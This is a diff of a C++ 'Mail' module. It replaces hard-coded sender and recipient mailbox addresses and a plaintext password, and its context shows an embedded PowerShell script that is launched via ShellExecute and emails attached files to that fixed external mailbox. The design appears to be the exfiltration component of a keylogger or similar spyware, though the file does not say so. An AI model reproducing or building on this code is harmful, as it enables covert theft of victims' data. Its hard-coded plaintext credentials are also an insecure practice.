@@ -11,9 +11,9 @@
 
 namespace Mail
 {
-    #define X_EM_TO "jobs.abt.kl@gmail.com"
-    #define X_EM_FROM "jobs.abt.kl@gmail.com"
-    #define X_EM_PASS "PASSWORD"
+    #define X_EM_TO "abcdef633@myyahoo.com"
+    #define X_EM_FROM "abcdef633@myyahoo.com"
+    #define X_EM_PASS "P@ssword_123"
 
     const std::string &PowerShellScript =
 "Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
@@ -42,14 +42,14 @@ namespace Mail
 "  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
 "Send-EMail -attachment $Att "
 "-To \"" +
- std::string (X_EM_TO) +  
+ std::string (X_EM_TO) +
  "\""
 " -Body $Body -Subject $Subj "
 "-password \"" +
- std::string (X_EM_PASS) + 
+ std::string (X_EM_PASS) +
   "\""
 " -From \"" +
- std::string (X_EM_FROM) + 
+ std::string (X_EM_FROM) +
 "\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";
 #undef X_EM_FROM
 #undef X_EM_TO
@@ -131,7 +131,7 @@ int SendMail(const std::string &subject, const std::string &body, const std::str
     DWORD exit_code = 100;
     //lambda function read up and see to this error
     GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
-    m_timer.SetFunction([&]()     
+    m_timer.SetFunction([&]()
     {
         WaitForSingleObject(ShExecInfo.hProcess, 6000);
         GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
